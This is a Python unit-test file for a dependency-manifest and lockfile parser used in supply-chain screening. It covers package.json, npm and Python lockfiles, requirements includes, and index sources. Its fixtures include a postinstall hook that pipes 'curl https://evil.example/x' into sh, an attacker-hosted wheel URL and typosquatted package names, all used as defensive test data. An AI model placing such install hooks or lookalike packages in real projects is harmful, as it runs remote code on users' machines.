"""清單與鎖定檔解析（scripts/g1_manifests.py）。 / Manifest and lockfile parsing.

從 g1_slopcheck.py 與 g1_sbom.py 的 selftest 搬來解析與分類的案例（#262，#260 的 S1），並補上這個切片新增的契約：
無解析器的清單由解析模組自己回報、直接／間接相依三態、-r 包含邊界是明確參數。
"""
import json
import pathlib
import sys
import tempfile
import unittest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "scripts"))
import g1_manifests as gm  # noqa: E402


class TmpTree(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.D = pathlib.Path(self._tmp.name).resolve()

    def write(self, rel, text):
        p = self.D / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
        return p

    def parse(self, rel, root=None):
        return gm.parse_manifest([self.D / rel], root=root or self.D)

    def names(self, parsed):
        return [d.name for d in parsed.entries]


class Classify(unittest.TestCase):
    """分類：快篩選檔（screen）與 SBOM 核對（sbom）各有一組現有樣式，逐字保留、不取聯集（#269 才會變嚴）。"""

    def test_screen_manifests_and_unparsed(self):
        # 從 g1_slopcheck selftest 搬來：Pipfile／setup.py 是尚無解析器的 manifest；npm-shrinkwrap 是可解析的
        self.assertEqual(gm.classify("setup.py").kind, "unparsed")
        self.assertEqual(gm.classify("npm-shrinkwrap.json").kind, "parsed")
        for name in ("pnpm-lock.yaml", "yarn.lock", "Pipfile", "Pipfile.lock", "setup.py", "setup.cfg", "sub/yarn.lock"):
            self.assertEqual(gm.classify(name).kind, "unparsed", name)
        for name in ("package.json", "package-lock.json", "pyproject.toml", "uv.lock", "poetry.lock", "requirements.txt"):
            self.assertEqual(gm.classify(name).kind, "parsed", name)

    def test_screen_unsupported_ecosystems(self):
        # #316：npm／PyPI 以外生態系的慣例清單檔 → unsupported（帶生態系名稱），不是 other；含子目錄
        cases = {"go.mod": "go", "go.sum": "go", "Cargo.toml": "rust", "Cargo.lock": "rust", "pom.xml": "maven",
                 "build.gradle": "gradle", "build.gradle.kts": "gradle", "Gemfile": "ruby", "Gemfile.lock": "ruby",
                 "composer.json": "php", "composer.lock": "php", "App.csproj": "nuget", "packages.config": "nuget",
                 "Directory.Packages.props": "nuget", "deno.json": "deno", "deno.jsonc": "deno", "mix.exs": "elixir",
                 "Package.swift": "swift", "pubspec.yaml": "dart", "environment.yml": "conda", "environment.yaml": "conda"}
        for name, eco in cases.items():
            for path in (name, f"services/api/{name}"):
                c = gm.classify(path)
                self.assertEqual((c.kind, c.ecosystem), ("unsupported", eco), path)
        # 既有分類不變；相近但不是慣例檔名的不算
        for name, kind in (("package.json", "parsed"), ("requirements.txt", "parsed"), ("pnpm-lock.yaml", "unparsed"),
                           ("docs/go.mod.md", "other"), ("mygo.mod", "other"), ("Cargo.toml.bak", "other"),
                           ("environment.yml.example", "other"), ("notes.csproj.txt", "other")):
            self.assertEqual(gm.classify(name).kind, kind, name)
        self.assertIsNone(gm.classify("package.json").ecosystem)
        # SBOM 核對的檢視不變（#316 決定 8）
        for name in ("go.sum", "Cargo.lock", "Gemfile.lock", "composer.lock"):
            self.assertEqual(gm.classify(name, view="sbom").kind, "other", name)

    def test_screen_requirements_directory(self):
        # 從 g1_slopcheck selftest 搬來：requirements/ 目錄下的 .txt 是 manifest；其他 .txt、非 .txt 不是
        self.assertEqual(gm.classify("requirements/base.txt").kind, "parsed")
        self.assertEqual(gm.classify("requirements/prod/web.txt").kind, "parsed")
        self.assertEqual(gm.classify("locks/python-requirements.txt").kind, "parsed")
        self.assertEqual(gm.classify("docs/notes.txt").kind, "other")
        self.assertEqual(gm.classify("requirements/README.md").kind, "other")

    def test_sbom_view(self):
        # 從 g1_sbom selftest 搬來
        for name in ("Pipfile.lock", "sub/bun.lock", "bun.lockb", "pdm.lock", "pylock.toml", "pylock.dev.toml",
                     "pnpm-lock.yaml", "yarn.lock"):
            self.assertEqual(gm.classify(name, view="sbom").kind, "unparsed", name)
        for name in ("docs/pylock-notes.md", "Pipfile.lock.bak"):
            self.assertEqual(gm.classify(name, view="sbom").kind, "other", name)
        self.assertEqual(gm.classify("app/npm-shrinkwrap.json", view="sbom").kind, "parsed")
        self.assertEqual(gm.classify("requirements/base.txt", view="sbom").kind, "parsed")
        self.assertEqual(gm.classify("docs/notes.txt", view="sbom").kind, "other")
        self.assertEqual(gm.classify("locks/python-requirements.txt", view="sbom").kind, "parsed")

    def test_is_lock(self):
        for name in ("package-lock.json", "npm-shrinkwrap.json", "uv.lock", "poetry.lock", "requirements.lock.txt",
                     "requirements/base.txt", "locks/python-requirements.txt"):
            self.assertTrue(gm.classify(name).is_lock, name)
            self.assertTrue(gm.classify(name, view="sbom").is_lock, name)
        for name in ("package.json", "pyproject.toml", "pnpm-lock.yaml", "docs/notes.txt"):
            self.assertFalse(gm.classify(name).is_lock, name)

    def test_screen_and_sbom_share_unparsed_lockfiles_while_only_screen_includes_non_locks(self):
        # #269：快篩補認 bun.lock、bun.lockb、pdm.lock、pylock*.toml（PEP 751）為無解析器清單；
        # 帶前綴或備份副檔名仍不算清單；SBOM 仍只看鎖定檔（不認 setup.py／setup.cfg／Pipfile）。
        for name in ("bun.lock", "sub/bun.lock", "bun.lockb", "pdm.lock", "sub/pdm.lock",
                     "pylock.toml", "pylock.dev.toml", "sub/pylock.prod.toml"):
            self.assertEqual(gm.classify(name), gm.Classified("unparsed", False), name)
            self.assertEqual(gm.classify(name, view="sbom"), gm.Classified("unparsed", False), name)
        for name in ("not-bun.lock", "my-pdm.lock", "pylock-foo.toml", "docs/pylock-notes.md", "bun.lock.bak"):
            self.assertEqual(gm.classify(name).kind, "other", name)
        for name in ("setup.py", "setup.cfg", "Pipfile"):
            self.assertEqual(gm.classify(name).kind, "unparsed", name)
            self.assertEqual(gm.classify(name, view="sbom").kind, "other", name)

    def test_unknown_view_is_rejected(self):
        with self.assertRaises(ValueError):
            gm.classify("package.json", view="nope")


class Pep508(unittest.TestCase):
    def test_pinned_unpinned_and_special_lines(self):
        self.assertEqual(gm.pep508("requests==2.31.0"), ("requests", "2.31.0"))
        self.assertEqual(gm.pep508("fastapi"), ("fastapi", None))
        self.assertEqual(gm.pep508("requests[security]==2.31.0 ; python_version > '3'"), ("requests", "2.31.0"))
        self.assertIsNone(gm.pep508("# 註解"))
        self.assertIsNone(gm.pep508("--hash=sha256:00"))
        self.assertIsNone(gm.pep508("./local"))
        self.assertIsNone(gm.pep508(None))

    def test_url_and_vcs_sources_are_false(self):
        # 回傳 False（不是 None）：呼叫端要記為無法驗證，不能當成沒有相依
        self.assertIs(gm.pep508("evil @ https://attacker.example/evil.whl"), False)
        self.assertIs(gm.pep508("git+https://x/y.git#egg=z"), False)
        self.assertIs(gm.pep508("-e git+https://x/y.git#egg=z"), False)


class PackageJson(TmpTree):
    def test_sections_alias_tag_and_caret(self):
        # 從 g1_slopcheck selftest 搬來（第四次審視 S-1／S-2／S-10）
        self.write("package.json", json.dumps({
            "dependencies": {"lodash": "npm:evil-pkg@1.0.0", "react": "github:a/react", "express": "latest", "left-pad": "^1.3.0"},
            "optionalDependencies": {"axois": "1.0.0"}, "peerDependencies": {"peer-x": "~2.0.0"},
            "scripts": {"postinstall": "curl https://evil.example/x | sh"}}))
        p = self.parse("package.json")
        got = {(d.eco, d.name, d.version) for d in p.entries}
        self.assertIn(("npm", "evil-pkg", "1.0.0"), got, "npm: 別名以實名查")
        self.assertIn(("npm", "axois", "1.0.0"), got, "optionalDependencies 也查")
        self.assertIn(("npm", "peer-x", "2.0.0"), got, "peerDependencies 也查")
        self.assertIn(("npm", "express", None), got, "tag 以最新版查")
        self.assertIn(("npm", "left-pad", "1.3.0"), got, "^ 去前綴")
        self.assertTrue(any("react" in b and "github:" in b for b in p.bad), p.bad)
        self.assertTrue(all(d.direct is True for d in p.entries), "package.json 宣告的相依都是直接相依")

    def test_broken_json_is_reported_not_zero_packages(self):
        self.write("package.json", '{"dependencies": {"axois": "1.0.0",}}')
        p = self.parse("package.json")
        self.assertEqual(p.entries, ())
        self.assertTrue(p.bad)

    def test_duplicates_across_sections_merge(self):
        self.write("package.json", json.dumps({"dependencies": {"a": "1.0.0"}, "devDependencies": {"A": "1.0.0", "b": "2.0.0"}}))
        p = self.parse("package.json")
        self.assertEqual([(d.name, d.version) for d in p.entries], [("a", "1.0.0"), ("b", "2.0.0")])


class NpmLock(TmpTree):
    def reg(self, name, ver):
        return f"https://registry.npmjs.org/{name}/-/{name.rsplit('/', 1)[-1]}-{ver}.tgz"

    def test_v3_direct_flags_aliases_links_and_non_registry(self):
        # 從 g1_slopcheck selftest 搬來
        reg = self.reg
        self.write("web/package-lock.json", json.dumps({"lockfileVersion": 3, "packages": {
            "": {"dependencies": {"playwrigth": "1.0.0", "strip-cjs": "npm:strip-ansi@6.0.1"}},
            "node_modules/playwrigth": {"version": "1.0.0", "resolved": reg("playwrigth", "1.0.0")},
            "node_modules/playwright-core": {"version": "1.63.0", "resolved": reg("playwright-core", "1.63.0")},
            "node_modules/loadsh": {"version": "0.0.4", "resolved": reg("loadsh", "0.0.4")},
            "node_modules/strip-cjs": {"name": "strip-ansi", "version": "6.0.1", "resolved": reg("strip-ansi", "6.0.1")},
            "node_modules/a/node_modules/strip-ansi": {"version": "6.0.1", "resolved": reg("strip-ansi", "6.0.1")},
            "node_modules/gitdep": {"version": "1.0.0", "resolved": "git+ssh://git@github.com/x/gitdep.git#abc"},
            "node_modules/ws-local": {"resolved": "packages/ws-local", "link": True},
            "packages/ws-local": {"version": "0.1.0"}}}))
        p = self.parse("web/package-lock.json")
        # 同一個 (名稱, 版本) 既是直接又是巢狀 → 合併後算直接（只有「全部都是間接」才不做名稱相似度）
        self.assertEqual(sorted((d.name, d.version, d.direct) for d in p.entries),
                         [("loadsh", "0.0.4", False), ("playwright-core", "1.63.0", False), ("playwrigth", "1.0.0", True),
                          ("strip-ansi", "6.0.1", True)])
        self.assertEqual(p.bad, ("package-lock.json: node_modules/gitdep",))

    def test_v1_nested_dependencies_alias_and_vendored(self):
        # 從 g1_slopcheck selftest 搬來
        reg = self.reg
        self.write("old/package-lock.json", json.dumps({"lockfileVersion": 1, "dependencies": {
            "left-pad": {"version": "1.3.0", "resolved": reg("left-pad", "1.3.0"),
                         "dependencies": {"ms": {"version": "2.1.3", "resolved": reg("ms", "2.1.3")}}},
            "sc": {"version": "npm:@scope/real@2.0.0", "resolved": reg("@scope/real", "2.0.0")},
            "vendored": {"version": "file:vendor/v.tgz"}}}))
        self.write("old/package.json", '{"dependencies": {"left-pad": "^1.3.0"}}')
        p = self.parse("old/package-lock.json")
        self.assertEqual(sorted((d.name, d.version, d.direct) for d in p.entries),
                         [("@scope/real", "2.0.0", False), ("left-pad", "1.3.0", True), ("ms", "2.1.3", False)])
        self.assertEqual(p.bad, ("package-lock.json: vendored",))

    def test_unreadable_lock_is_reported(self):
        self.write("package-lock.json", "{not json")
        p = self.parse("package-lock.json")
        self.assertEqual(p.entries, ())
        self.assertEqual(p.bad, ("package-lock.json: 整份檔案無法解析",))


class Requirements(TmpTree):
    def test_url_vcs_and_missing_include_are_reported(self):
        # 從 g1_slopcheck selftest 搬來（第五次審查 G1-3）
        self.write("requirements.txt", "requests==2.31.0\nevil @ https://attacker.example/evil.whl\n-e git+https://x/y.git#egg=z\n-r base.txt\n")
        p = self.parse("requirements.txt")
        self.assertEqual(self.names(p), ["requests"])
        self.assertEqual(len(p.bad), 3, p.bad)
        self.assertTrue(any("-r base.txt" in b for b in p.bad), p.bad)

    def test_recursive_include_cycle_and_outside_project(self):
        # 從 g1_slopcheck selftest 搬來：-r／--requirement= 引入的套件都要查到；循環與超出目標專案要回報；-c／--pre／--hash 略過
        self.write("reqs/base.in", "evilpkgxyz==1.0.0\n-r ../requirements-dev.txt\n")
        self.write("requirements-dev.txt", "pytest==8.0.0\n--requirement=reqs/extra.txt\n-rreqs/base.in\n")
        self.write("reqs/extra.txt", "httpx==0.27.0 \\\n    --hash=sha256:00\n-c constraints.txt\n--pre\n")
        self.write("requirements.txt", "requests==2.31.0\n-r reqs/base.in  # 共用\n-r ../../outside.txt\n")
        p = self.parse("requirements.txt")
        self.assertEqual(sorted(self.names(p)), ["evilpkgxyz", "httpx", "pytest", "requests"])
        self.assertTrue(any("循環引入" in b for b in p.bad), p.bad)
        self.assertTrue(any("超出目標專案" in b for b in p.bad), p.bad)
        self.assertEqual(len(p.bad), 2, p.bad)

    def test_package_index_sources(self):
        # 從 g1_slopcheck selftest 搬來：套件來源不是公開 PyPI → 無法驗證；明確指定公開 PyPI 不算
        cases = [("--index-url https://pypi.org/simple/", 0), ("-i https://pypi.python.org/simple", 0),
                 ("--index-url https://pypi.internal.example/simple", 1), ("-i https://evil.example/simple", 1),
                 ("--extra-index-url https://pypi.internal.example/simple", 1),
                 ("--extra-index-url https://pypi.org/simple", 1),   # 額外 index 一律回報：相依混淆的典型入口
                 ("--index-url=https://priv.example/simple", 1), ("-f ./wheels", 1), ("--find-links=https://x/", 1),
                 ("--no-index", 1), ("--trusted-host pypi.internal.example", 0)]
        for line, want in cases:
            with self.subTest(line=line):
                self.write("requirements.txt", f"{line}\nrequests==2.31.0\n")
                p = self.parse("requirements.txt")
                self.assertEqual(self.names(p), ["requests"])
                self.assertEqual(len(p.bad), want, p.bad)

    def test_requirements_directory_file_is_parsed(self):
        # 從 g1_slopcheck selftest 搬來：以前選檔會選到 requirements/base.txt，解析卻只看檔名 → 一個套件都沒查 → pass
        self.write("requirements/base.txt", "requests==2.31.0\nreqeusts-helperz==0.0.1\n")
        p = self.parse("requirements/base.txt")
        self.assertEqual(sorted(self.names(p)), ["reqeusts-helperz", "requests"])
        self.assertEqual(p.bad, ())

    def test_direct_is_unknown(self):
        self.write("requirements.txt", "requests==2.31.0\n")
        self.assertEqual([d.direct for d in self.parse("requirements.txt").entries], [None])

    def test_include_boundary_is_the_explicit_root(self):
        # #260（S1）／#270：並排對照「root＝專案根目錄」與「root＝檔案所在目錄（#270 前 g1_sbom 舊邊界）」在三種 -r 情境的結果
        proj = self.D / "proj"
        self.write("outside.txt", "idna==3.10\n")
        self.write("proj/base.txt", "pytest==8.0.0\n")
        self.write("proj/requirements/sibling.txt", "pytest==8.0.0\n")
        self.write("proj/requirements/same.txt", "requests==2.31.0\n-r sibling.txt\n")
        self.write("proj/requirements/dev.txt", "requests==2.31.0\n-r ../base.txt\n")
        self.write("proj/requirements/out.txt", "requests==2.31.0\n-r ../../outside.txt\n")

        # 1. 同目錄包含：新舊邊界一致通過
        for boundary in (proj, proj / "requirements"):
            same = self.parse("proj/requirements/same.txt", root=boundary)
            self.assertEqual(sorted(self.names(same)), ["pytest", "requests"])
            self.assertEqual(same.bad, ())

        # 2. 往上包含（仍在專案根目錄內）：專案根目錄通過；檔案所在目錄回報超出目標專案
        inside = self.parse("proj/requirements/dev.txt", root=proj)
        self.assertEqual(sorted(self.names(inside)), ["pytest", "requests"])
        self.assertEqual(inside.bad, ())
        file_dir = self.parse("proj/requirements/dev.txt", root=proj / "requirements")
        self.assertEqual(self.names(file_dir), ["requests"])
        self.assertTrue(any("超出目標專案" in b for b in file_dir.bad), file_dir.bad)

        # 3. 超出專案根目錄（即使樹外真有 outside.txt）：新舊邊界一致回報超出目標專案
        for boundary in (proj, proj / "requirements"):
            escaped = self.parse("proj/requirements/out.txt", root=boundary)
            self.assertEqual(self.names(escaped), ["requests"])
            self.assertTrue(any("超出目標專案" in b for b in escaped.bad), escaped.bad)

    def test_root_that_is_not_an_ancestor_falls_back_to_the_file_directory(self):
        # 重構前：被掃描目標不是檔案的祖先目錄時，邊界退回檔案所在目錄
        other = self.D / "elsewhere"
        other.mkdir()
        self.write("proj/requirements.txt", "requests==2.31.0\n-r sibling.txt\n-r ../up.txt\n")
        self.write("proj/sibling.txt", "pytest==8.0.0\n")
        self.write("up.txt", "httpx==0.27.0\n")
        p = self.parse("proj/requirements.txt", root=other)
        self.assertEqual(sorted(self.names(p)), ["pytest", "requests"])
        self.assertTrue(any("超出目標專案" in b for b in p.bad), p.bad)


class PythonProjectFiles(TmpTree):
    def test_pyproject_url_requirement_is_reported(self):
        # 從 g1_slopcheck selftest 搬來
        self.write("pyproject.toml", '[project]\ndependencies = ["fastapi", "evil @ git+https://x/y.git"]\n')
        p = self.parse("pyproject.toml")
        self.assertEqual(self.names(p), ["fastapi"])
        self.assertEqual(len(p.bad), 1)
        self.assertTrue(all(d.direct is True for d in p.entries))

    def test_broken_toml_is_reported(self):
        # 從 g1_slopcheck selftest 搬來
        self.write("pyproject.toml", "[project\nbroken")
        p = self.parse("pyproject.toml")
        self.assertEqual((p.entries, p.bad, p.unparsed), ((), ("pyproject.toml: TOML 無法解析（或 tomllib 缺席）",), ()))

    def test_uv_lock_non_registry_sources(self):
        # 從 g1_slopcheck selftest 搬來：git、url、本地封存檔、私有 registry 來源不查公開 PyPI，回報無法驗證
        self.write("uv.lock",
                   'version = 1\n[[package]]\nname = "proj"\nversion = "0.1.0"\nsource = { editable = "." }\n'
                   '[[package]]\nname = "requests"\nversion = "2.32.0"\nsource = { registry = "https://pypi.org/simple" }\n'
                   '[[package]]\nname = "gitdep"\nversion = "1.0.0"\nsource = { git = "https://github.com/x/gitdep?rev=abc" }\n'
                   '[[package]]\nname = "urldep"\nversion = "1.0.0"\nsource = { url = "https://x.example/urldep-1.0.0.tar.gz" }\n'
                   '[[package]]\nname = "whl"\nversion = "1.0.0"\nsource = { path = "vendor/whl-1.0.0-py3-none-any.whl" }\n'
                   '[[package]]\nname = "internal"\nversion = "1.0.0"\nsource = { registry = "https://pypi.corp.example/simple" }\n')
        p = self.parse("uv.lock")
        self.assertEqual(self.names(p), ["requests"])
        self.assertEqual(len(p.bad), 4, p.bad)
        self.assertEqual([d.direct for d in p.entries], [None], "鎖定檔無法確定直接／間接：未知，視同直接")

    def test_poetry_lock_git_private_index_and_local_directory(self):
        # 從 g1_slopcheck selftest 搬來
        self.write("poetry.lock",
                   '[[package]]\nname = "requests"\nversion = "2.32.0"\n'
                   '[[package]]\nname = "gitdep"\nversion = "1.0.0"\n[package.source]\ntype = "git"\nurl = "https://github.com/x/g.git"\n'
                   '[[package]]\nname = "internal"\nversion = "1.0.0"\n[package.source]\ntype = "legacy"\nurl = "https://pypi.corp.example/simple"\nreference = "corp"\n'
                   '[[package]]\nname = "local"\nversion = "0.1.0"\n[package.source]\ntype = "directory"\nurl = "../local"\n')
        p = self.parse("poetry.lock")
        self.assertEqual(self.names(p), ["requests"])
        self.assertEqual(len(p.bad), 2, p.bad)


class UnparsedAndUnknown(TmpTree):
    def test_manifest_without_a_parser_is_reported(self):
        # 從 g1_slopcheck selftest 搬來：被選為 manifest 卻沒有解析器 → 回報無法驗證（不是 0 個套件、沒有問題）
        self.write("weird-package.lock", "whatever\n")
        p = self.parse("weird-package.lock")
        self.assertEqual(p.bad, ("weird-package.lock: 沒有對應的解析器，其中的套件未檢查",))

    def test_unparsed_manifests_are_reported_by_the_parser_itself(self):
        # 這個切片新增：以前 parse_manifest 悄悄略過、main 再自己用 UNPARSED_RE 找出來補記
        a = self.write("a/pnpm-lock.yaml", "lockfileVersion: 9\n")
        b = self.write("b/setup.py", "from setuptools import setup\n")
        d = self.write("c/bun.lock", "{}\n")
        e = self.write("c/bun.lockb", "bin\n")
        f = self.write("d/pdm.lock", "[metadata]\n")
        g = self.write("d/pylock.dev.toml", 'lock-version = "1.0"\n')
        c = self.write("package.json", '{"dependencies": {"left-pad": "1.3.0"}}')
        p = gm.parse_manifest([a, d, e, c, f, g, b], root=self.D)
        self.assertEqual(p.unparsed, (str(a), str(d), str(e), str(f), str(g), str(b)), "依輸入順序、原樣回報輸入路徑")
        self.assertEqual(self.names(p), ["left-pad"])
        self.assertEqual(p.bad, (), "無解析器不放進 bad：兩者在輸出中是不同的未完成原因")

    def test_missing_files_are_skipped_silently(self):
        # 不存在的檔不報（呼叫端在這之前已處理「指定的檔案不存在」）；無解析器的檔也一樣先看存在與否
        p = gm.parse_manifest([self.D / "nope.txt", self.D / "nope/yarn.lock"], root=self.D)
        self.assertEqual((p.entries, p.bad, p.unparsed), ((), (), ()))

    def test_multiple_files_are_merged_and_deduplicated(self):
        self.write("a/requirements.txt", "requests==2.31.0\n")
        self.write("b/requirements.txt", "Requests==2.31.0\nhttpx==0.27.0\n")
        p = gm.parse_manifest([self.D / "a/requirements.txt", self.D / "b/requirements.txt"], root=self.D)
        self.assertEqual([(d.name, d.version) for d in p.entries], [("requests", "2.31.0"), ("httpx", "0.27.0")])


if __name__ == "__main__":
    unittest.main()
